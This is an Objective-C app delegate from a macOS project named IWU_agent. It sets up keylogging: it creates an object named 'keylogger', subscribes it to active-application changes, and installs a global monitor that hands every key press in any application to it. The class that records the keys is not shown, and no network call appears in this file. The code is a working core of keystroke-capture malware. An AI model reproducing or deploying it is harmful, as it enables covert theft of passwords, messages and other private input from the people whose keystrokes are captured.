//
//  delegate.m
//  IWU_agent
//
//  Created by Admin on 17.03.16.
//  Copyright © 2016 Admin. All rights reserved.
//

#import "delegate.h"

@implementation delegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    keylogger = [[logging alloc] init];
    
    //Notifications for active applications
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:keylogger
                                                           selector:@selector(appDidActivate:)
                                                               name:NSWorkspaceDidActivateApplicationNotification
                                                             object:nil];
    
    //Notifications for key presses
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
                                           handler:^ (NSEvent *event) {[keylogger keyPress:event];}];
    
}

- (void)dealloc {
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:keylogger];
}

@end
